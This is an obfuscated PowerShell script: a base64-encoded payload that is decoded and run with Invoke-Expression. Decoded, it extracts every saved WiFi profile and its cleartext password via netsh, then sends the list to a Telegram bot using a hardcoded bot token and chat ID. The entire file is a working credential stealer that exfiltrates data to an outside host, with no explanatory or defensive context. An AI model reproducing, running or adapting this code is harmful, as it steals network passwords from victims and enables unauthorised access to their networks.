$encodedScript = 'IyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcw0KZnVuY3Rpb24gR2V0LVdMQU5fUHJvZmlsZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsJ2VuLUVOJyldDQogICAgICAgICRMQU5HVUFHRSA9ICRIb3N0LkN1cnJlbnRVSUN1bHR1cmUuTmFtZQ0KICAgICkNCg0KICAgICRMQU5HVUFHRVMgPSBAew0KICAgICAgICAnZXMtRVMnID0gQHsNCiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICAgID0gJ1BlcmZpbCBkZSB0b2RvcyBsb3MgdXN1YXJpb3MnDQogICAgICAgICAgICAncHJvZmlsZV9ub3RfZm91bmRfdGV4dCcgICA9ICdObyBzZSBlbmN1ZW50cmEgZWwgcGVyZmlsJw0KICAgICAgICAgICAgJ3NzaWRfbmFtZV90ZXh0JyAgICAgICAgICAgPSAnTm9tYnJlIGRlIFNTSUQnDQogICAgICAgICAgICAnbmV0d29ya190eXBlX3RleHQnICAgICAgICA9ICdUaXBvIGRlIHJlZCcNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGlvbl90ZXh0JyAgICAgID0gJ0F1dGVudGljYWNpw4PCs24nDQogICAgICAgICAgICAnZW5jcnlwdGlvbl90ZXh0JyAgICAgICAgICA9ICdDaWZyYWRvJw0KICAgICAgICAgICAgJ2tleV90ZXh0JyAgICAgICAgICAgICAgICAgPSAnQ29udGVuaWRvIGRlIGxhIGNsYXZlJw0KICAgICAgICB9DQogICAgICAgICdlbi1FTicgPSBAew0KICAgICAgICAgICAgJ3VzZXJfcHJvZmlsZXNfdGV4dCcgICAgICAgPSAnQWxsIFVzZXIgUHJvZmlsZScNCiAgICAgICAgICAgICdwcm9maWxlX25vdF9mb3VuZF90ZXh0JyAgID0gJ1Byb2ZpbGUgbm90IGZvdW5kJw0KICAgICAgICAgICAgJ3NzaWRfbmFtZV90ZXh0JyAgICAgICAgICAgPSAnU1NJRCBuYW1lJw0KICAgICAgICAgICAgJ25ldHdvcmtfdHlwZV90ZXh0JyAgICAgICAgPSAnTmV0d29yayBUeXBlJw0KICAgICAgICAgICAgJ2F1dGhlbnRpY2F0aW9uX3RleHQnICAgICAgPSAnQXV0aGVudGljYXRpb24nDQogICAgICAgICAgICAnZW5jcnlwdGlvbl90ZXh0JyAgICAgICAgICA9ICdDaXBoZXInDQogICAgICAgICAgICAna2V5X3RleHQnICAgICAgICAgICAgICAgICA9ICdLZXkgQ29udGVudCcNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICRMQU5HID0gJExBTkdVQUdFUy4iJExBTkdVQUdFIg0KDQogICAgZnVuY3Rpb24gZ2V0VmFsdWVCeU5hbWUgKCRpbnB1dFRleHQsICRuYW1lU3RyaW5nKSB7DQogICAgICAgICR2YWx1ZSA9ICIiDQogICAgICAgIGlmIChbcmVnZXhdOjpJc01hdGNoKCRpbnB1dFRleHQsICJcYiRuYW1lU3RyaW5nXGIiLCAiSWdub3JlQ2FzZSIpKSB7DQogICAgICAgICAgICAkdmFsdWUgPSAoW3JlZ2V4XTo6UmVwbGFjZSgkaW5wdXRUZXh0LCAiXlteOl0qOiAiLCIiKSkgDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICR2YWx1ZS5UcmltKCkNCiAgICB9DQoNCiAgICAkUHJvZmlsZXMgPSBAKCkNCiAgICBuZXRzaCB3bGFuIHNob3cgcHJvZmlsZXMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICRwcm9maWxlID0gZ2V0VmFsdWVCeU5hbWUgJF8gJExBTkdbJ3VzZXJfcHJvZmlsZXNfdGV4dCddDQogICAgICAgIGlmICgkcHJvZmlsZSkgew0KICAgICAgICAgICAgJFByb2ZpbGVzICs9ICRwcm9maWxlDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkV0xBTl9Qcm9maWxlcyA9IEAoKQ0KICAgICRyb3dOdW1iZXIgPSAtMQ0KICAgICRQcm9maWxlcyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgJHdsYW5fUHJvZmlsZSA9IG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlICRfIGtleT1jbGVhcg0KICAgICAgICBpZiAoJHdsYW5fUHJvZmlsZS5Db250YWlucygkTEFOR1sncHJvZmlsZV9ub3RfZm91bmRfdGV4dCddKSkgew0KICAgICAgICAgICAgcmV0dXJuDQogICAgICAgIH0NCiAgICAgICAgJEludGVyZmFjZU5hbWUgPSAkbnVsbA0KICAgICAgICAkd2xhbl9Qcm9maWxlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgaWYgKCEoJEludGVyZmFjZU5hbWUpKSB7DQogICAgICAgICAgICAgICAgJEludGVyZmFjZU5hbWUgPSBnZXRWYWx1ZUJ5TmFtZSAkXyAkTEFOR1snc3NpZF9uYW1lX3RleHQnXQ0KICAgICAgICAgICAgICAgICRJbnRlcmZhY2VOYW1lID0gJEludGVyZmFjZU5hbWUuVHJpbSgnIicpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgaWYgKCRJbnRlcmZhY2VOYW1lKSB7DQogICAgICAgICAgICAgICAgICAgICRyb3cgPSBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSBAew0KICAgICAgICAgICAgICAgICAgICAgICAgSW50ZXJmYWNlTmFtZSAgPSAkSW50ZXJmYWNlTmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgU1NJRCAgICAgICAgICAgPSAkSW50ZXJmYWNlTmFtZQ0KICAgICAgICAgICAgICAgICAgICAgICAgS2V5ICAgICAgICAgICAgPSAiIg0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICRyb3dOdW1iZXIgKz0gMQ0KICAgICAgICAgICAgICAgICAgICAkV0xBTl9Qcm9maWxlcyArPSAkcm93DQogICAgICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICghKCRXTEFOX1Byb2ZpbGVzWyRyb3dOdW1iZXJdLktleSkpIHsNCiAgICAgICAgICAgICAgICAkS2V5ID0gZ2V0VmFsdWVCeU5hbWUgJF8gJExBTkdbJ2tleV90ZXh0J10NCiAgICAgICAgICAgICAgICBpZiAoJEtleSkgew0KICAgICAgICAgICAgICAgICAgICAkV0xBTl9Qcm9maWxlc1skcm93TnVtYmVyXS5LZXkgPSAkS2V5DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKCRXTEFOX1Byb2ZpbGVzLkNvdW50IC1ndCAwKSB7DQogICAgICAgICRyZXN1bHRNZXNzYWdlID0gIkNvbnRyYXNlw4PCsWFzIFdpRmkgZW5jb250cmFkYXM6YHJgbiINCiAgICAgICAgJHJlc3VsdE1lc3NhZ2UgKz0gIkF1dG9yOiBMdWlzaGnDg8KxbyBQZXJpY2VuYWByYG5Nw4PCoXMgaW5mb3JtYWNpw4PCs246IFtCbG9nXShodHRwczovL2xwZXJpY2VuYS5ibG9nc3BvdC5jb20vKWByYG5gcmBuIg0KICAgICAgICAkV0xBTl9Qcm9maWxlcyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJTU0lEOiAkKCRfLlNTSUQpYHJgbkNvbnRyYXNlw4PCsWE6ICQoJF8uS2V5KWByYG5gcmBuIg0KICAgICAgICB9DQogICAgICAgICdUb3RhbCBXTEFOX1Byb2ZpbGVzOiAnICsgJFdMQU5fUHJvZmlsZXMuQ291bnQNCiAgICAgICAgcmV0dXJuICRyZXN1bHRNZXNzYWdlDQogICAgfSBlbHNlIHsNCiAgICAgICAgcmV0dXJuICdObyBzZSBlbmNvbnRyYXJvbiBwZXJmaWxlcyBXTEFOLicNCiAgICB9DQp9DQoNCiMgRnVuY3Rpb24gdG8gc2VuZCBhIG1lc3NhZ2UgdG8gVGVsZWdyYW0NCmZ1bmN0aW9uIFNlbmQtVGVsZWdyYW1NZXNzYWdlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHRva2VuLA0KICAgICAgICBbc3RyaW5nXSRjaGF0SWQsDQogICAgICAgIFtzdHJpbmddJG1lc3NhZ2UNCiAgICApDQoNCiAgICAkdXJsID0gImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkdG9rZW4vc2VuZE1lc3NhZ2UiDQoNCiAgICAkcGFyYW1zID0gQHsNCiAgICAgICAgY2hhdF9pZCA9ICRjaGF0SWQNCiAgICAgICAgdGV4dCA9ICRtZXNzYWdlDQogICAgfQ0KDQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkdXJsIC1NZXRob2QgUG9zdCAtQm9keSAkcGFyYW1zDQp9DQoNCiMgVGVsZWdyYW0gY29uZmlndXJhdGlvbg0KJHRva2VuID0gIjYyOTM4ODQ0MTc6QUFHVmpDSHhiU0FRUDQ4WHJjbTNZNFFJZ3dxeTNqX3hFaHMiDQokY2hhdElkID0gIjExNjMwMzk0MzkiDQoNCiMgUnVuIHRoZSBHZXQtV0xBTl9Qcm9maWxlcyBmdW5jdGlvbiBhbmQgc3RvcmUgdGhlIHJlc3VsdA0KJHJlc3VsdCA9IEdldC1XTEFOX1Byb2ZpbGVzDQoNCiMgU2VuZCB0aGUgcmVzdWx0IGFzIGEgbWVzc2FnZSB0byBUZWxlZ3JhbQ0KU2VuZC1UZWxlZ3JhbU1lc3NhZ2UgLXRva2VuICR0b2tlbiAtY2hhdElkICRjaGF0SWQgLW1lc3NhZ2UgJHJlc3VsdA=='
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
